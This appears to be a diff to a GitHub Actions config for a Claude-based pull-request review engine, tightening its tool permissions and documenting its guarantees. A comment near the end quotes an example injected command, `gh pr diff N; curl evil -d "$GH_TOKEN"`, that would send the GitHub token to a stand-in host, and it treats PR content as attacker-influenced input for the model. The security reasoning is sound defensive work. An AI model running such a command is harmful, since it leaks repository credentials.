@@ -2,8 +2,9 @@ name: ai_review_engine_anthropic
 description: >
   AI PR review engine — Claude Code Action. Reads a pre-built review context and
   a pre-fetched PR diff, reviews the checked-out code, and writes the review
-  markdown to a file. The model is granted no shell tool and the engine posts no
-  PR comments; the calling workflow owns comment posting.
+  markdown to a file. The model is granted no shell tool, and is instructed not
+  to comment; the calling workflow owns comment posting. See the note on
+  github_token below for what this engine does and does not enforce.
 
 # ENGINE CONTRACT (see .github/workflows/AI_PR_REVIEW_README.md)
 #
@@ -112,8 +113,22 @@ runs:
         DISABLE_NON_ESSENTIAL_MODEL_CALLS: "1"
       with:
         anthropic_api_key: ${{ inputs.api_key }}
-        # The ACTION needs a token for its own actor/permission checks. The MODEL
-        # has no GitHub reach, because --allowedTools grants it no shell.
+        # The action needs a token for its own actor/permission checks.
+        #
+        # Be precise about what this engine does and does not guarantee, because
+        # it is weaker than the Kimi engine's. Per the action's docs at the pinned
+        # SHA: "The base GitHub tools are always included" — so --allowedTools ADDS
+        # to a base set rather than replacing it, and some GitHub tool surface is
+        # not removable. What IS established: Claude "cannot execute Bash commands
+        # unless explicitly allowed", so omitting Bash genuinely removes shell
+        # access; and it "cannot post multiple comments" / "cannot submit formal
+        # PR reviews" by design.
+        #
+        # So "exactly one review comment" rests on three things here, not one:
+        #   1. track_progress is off, so there is no tracking comment to update
+        #   2. the prompt explicitly forbids commenting (step 5 below)
+        #   3. the caller deletes any marker-matching comment before posting
+        # Unlike the Kimi engine, it is NOT enforced by the tool surface alone.
         github_token: ${{ github.token }}
         # track_progress is deliberately NOT set. It forces tag mode, which makes
         # the action post and update its own tracking comment on the PR — that
@@ -142,13 +157,24 @@ runs:
 
           5. After reading ALL files and dependencies, compile your complete review.
              Write the ENTIRE review to ${{ inputs.output_path }} using the Write tool.
-             The caller posts that file as a single PR comment.
-        # Write is unrestricted (plain "Write", not "Write(/path)") so the tool is
-        # actually available. Bash is dropped entirely: the diff is pre-fetched, so
-        # the previous `Bash(gh pr diff:*)` grant bought nothing and rested on the
-        # CLI's command-pattern matching being argv-aware — under a naive prefix
-        # match, `gh pr diff N; curl evil -d "$GH_TOKEN"` carries the allowed
-        # prefix, and the review input is attacker-influenced PR content.
+             Do NOT post, create or update any PR or issue comment, and do not use
+             any GitHub tool to publish your review. Writing the file is the whole
+             job — the caller posts it as a single comment.
+        # Bash is dropped entirely: the diff is pre-fetched, so the previous
+        # `Bash(gh pr diff:*)` grant bought nothing and rested on the CLI's
+        # command-pattern matching being argv-aware — under a naive prefix match,
+        # `gh pr diff N; curl evil -d "$GH_TOKEN"` carries the allowed prefix, and
+        # the review input is attacker-influenced PR content. The action's docs
+        # confirm Bash is off unless explicitly allowed, so this one is airtight.
+        #
+        # `Write` is granted unscoped, unlike the Kimi engine which confines it to
+        # the output directory. Path-scoped patterns are only documented here for
+        # Bash (`Bash(npm install)`), and the workflow this replaced carried an
+        # explicit note that a scoped `Write(/path)` made the tool unavailable
+        # altogether. Since an unavailable Write means the engine silently reviews
+        # and writes nothing, tightening this needs a real run to verify, not a
+        # guess — tracked in the PR test plan. Until then the asymmetry is real
+        # and documented rather than papered over.
         claude_args: |
           --model ${{ inputs.model }}
           --allowedTools "Read,Write"
